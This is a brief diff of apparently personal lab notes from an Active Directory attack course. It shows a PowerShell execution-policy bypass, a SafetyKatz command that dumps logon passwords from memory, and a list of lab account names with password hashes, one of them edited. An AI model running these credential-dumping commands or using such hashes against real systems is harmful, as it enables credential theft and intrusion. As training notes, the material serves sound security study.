@@ -48,7 +48,7 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 - [ ] `SafetyKatz.exe "privilege::debug" "token::elevate" "sekurlsa::evasive-logonPasswords" "exit"`
 ![[Pasted image 20260727164436.png]]
 
-studvm$  -> 76a995e2ff185255fec109df0f7448b8 
+studvm$  -> 0e768d8eb5c24c4efcba432195e1ccc4
 studentuser -> 733a816e09ea7d0228a63cb2bc81561b 
 studentadmin -> 97daeac345542c952eea4446471ca158 
 
